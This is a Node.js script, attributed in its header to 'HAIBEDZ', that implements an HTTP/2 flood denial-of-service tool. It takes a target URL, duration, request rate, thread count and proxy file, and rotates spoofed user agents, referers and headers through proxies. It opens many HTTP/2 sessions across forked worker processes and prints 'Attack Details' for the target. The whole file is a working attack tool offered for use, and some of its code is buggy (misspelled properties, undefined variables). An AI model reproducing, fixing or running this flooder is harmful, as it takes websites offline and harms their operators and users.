//OLD SCRIPT 2021,BY HAIBEDZ
const Chance = require("chance");
const http2 = require("http2");
const cluster = require("cluster");
const os = require("os");
const path = require("path");
const tls = require("tls");
const axios = require("axios");
const fs = require("fs");
const hpack = require("hpack");
const { HttpsProxyAgent } = require("https-proxy-agent");
const url = require("url");
const file = process.argv[1];
const name = path.basename(file);
const args = () => {
	return {
		target: process.argv[2],
		time: process.argv[3],
		rps: process.argv[4],
		thread: process.argv[5],
		proxyfile: process.argv[6],
	};
}
const { target, time, rps, thread, proxyfile } = args();
const chance = new Chance();
if (process.argv.length < 7) {
	console.log(`Using: node ${name} target time rps thread proxyfile`);
	process.exit();
}
const parsedUrl = url.parse(target)
if (parsedUrl.protcol !== "http:" && parsedUrl.protocol !== "https:" ) {
	console.log("Invalid protocol");
	process.exit();
}
axios({
	url: target,
	method: "GET"
})
.catch(error => {
	if (error.code === "ENOTFOUND") {
		console.log("Invalid hostname");
		process.exit();
	}
});
const randomUa = () => {
    const s1 = ["(iPhone; CPU iPhone OS 15_0_1 like Mac OS X)", "(Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv)", "(Linux; Android 11; M2103K19PY)", "(Linux; arm_64; Android 11; SM-A515F)", "(Linux; Android 11; SAMSUNG SM-A307FN)", "(Linux; Android 10; SM-A025F)", "(Windows NT 10.0; Win64; x64)", "(Windows NT 6.3)"];
    const s2 = ["AppleWebKit/605.1.15", "AppleWebKit/537.36"];
    const s3 = ["Version/15.0 Mobile/15E148 Safari/604.1", "Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36", "Chrome/96.0.4664.104 Mobile Safari/537.36", "Mobile/15E148", "SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"];
    const nm1 = chance.pickone(s1);
    const nm2 = chance.pickone(s2);
    const nm3 = chance.pickone(s3);
    return `Mozilla/5.0 ${nm1} ${nm2} (KHTML, like Gecko) ${nm3}`;
}
const accept = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
];
const lang = [
 'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-GB,en-US;q=0.9,en;q=0.8',
  'en-GB,en;q=0.5',
  'en-CA',
];
const encoding = [
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
];
const control_header = [
  'max-age=604800',
  'proxy-revalidate',
  'public, max-age=0',
  'max-age=315360000',
  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
  's-maxage=604800',
  'max-stale',
  'public, immutable, max-age=31536000',
  'must-revalidate',
  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
  'max-age=31536000,public,immutable',
  'max-age=31536000,public',
  'min-fresh',
  'private',
  'public',
  's-maxage',
  'no-cache',
  'no-cache, no-transform',
  'max-age=2592000',
  'no-store',
  'no-transform',
  'max-age=31557600',
  'stale-if-error',
  'only-if-cached',
  'max-age=0',
];
const ref = [
	"https://baidu.com",
	"https://google.com",
	"https://google.com.vn",
	"https://bing.com",
	"https://youtube.com",
];
const header = {
	":method": "GET",
	":path": parsedUrl.pathname,
	":authority": parsedUrl.hostname,
	":scheme": parsedUrl.protocol.replace(":", ""),
	"user-agent": randomUa(),
	"accept": chance.pickone(accept),
	"accept-language": chance.pickone(lang),
	"accept-encoding": chance.pickone(encoding),
	"origin": target,
	"protocol": "h2",
	"upgrade-insecure-requests": "1",
	"cache-control": control_header,
	"referer": chance.pickone(ref),
}
let readFile;
try {
	readFile = fs.readFileSync(proxyfile, 'utf8').trim().split("\n");
} catch {
	console.log("Invalid proxyfile");
	process.exit();
}
const feel = readFile.filter(proxy => proxy.endsWith(':8080'));
function startflood() {
	for (let i = 0;i < rps;i++) {
		setInterval(() => {
			const proxies = chance.pickone(feel);
			const proxiesUrl = `http://${proxies}`;
			const agent = new HttpsProxyAgent(proxiesUrl);
			const request1 = http2.connect(target, { agent });
			const request2 = http2.connect(target, { agent });
			const request3 = http2.connect(target, { agent });
//			request1.end();
//			request2.end();
//			request3.end();
			console.log(`launch ${proxiesUrl}`);
			const session = http2.connect(target, {
				settings: {
					maxConcurrentStreams: 2000,
					headerTableSize: 65536,
					initialWindowSize: 6291456,
					maxHeaderListSize: 262144,
					enablePush: false,
				},
				maxSessionMemory: 64000,
				maxDeflateDynamicTableSize: 4294967295,
				agent,
				protocol: "https:",
			});
			session.settings({
				maxConcurrentStreams: 2000,
				initialWindowSize: 6291456,
				headerTableSize: 65536,
				maxHeaderListSize: 262144,
				enablePush: false,
			});
			const hpackEncoder = new hpack();
			const encoder = hpackEncoder.encode(header);
			const lon = session.request(encoder);
			axios.get(target);
			lon.on("response", () => {
				lon.end();
				lon.destroy();
				return;
			})
			lon.on("error", () => {
				lon.end();
				lon.destroy();
				return;
			});
			lon.on("end", () => {
				lone.end();
				lon.destroy();
				return;
			})

		})
	}
}
if(cluster.isMaster) {
	console.clear();
	console.log("  Attack Details:")
	console.log("--------------------");
	console.log(`    Target: ${parsedUrl.hostname}`);
	console.log(`    Time: ${time}`);
	console.log(`    Rps: ${rps}`);
	console.log(`    Thread: ${thread}`);
	const handleReset = () => {
		const total = os.totalmem();
		const used = process.memoryUsage().rss;
		const percentage = (used / total) * 100;
		if ( percentage >= 85 ) {
			console.log("[!] Ram is full, proceed to kill worker");
			const workers = Object.value(cluster.workers);
			const randomWorker = chance.pickone(workers);
			randomWorker.kill();
			cluster.on("exit", (worker, code, signal) => {
				cluster.fork();
			});
		}
	}
	setInterval(() => {
		handleReset();
	}, 2000);
	for (let i = 0;i < thread;i++) {
		cluster.fork();
	}
} else {
	setInterval(() => {
		startflood();
	})
}
setTimeout(() => {
	console.log("Attack is over");
	process.exit();
}, time * 1000);
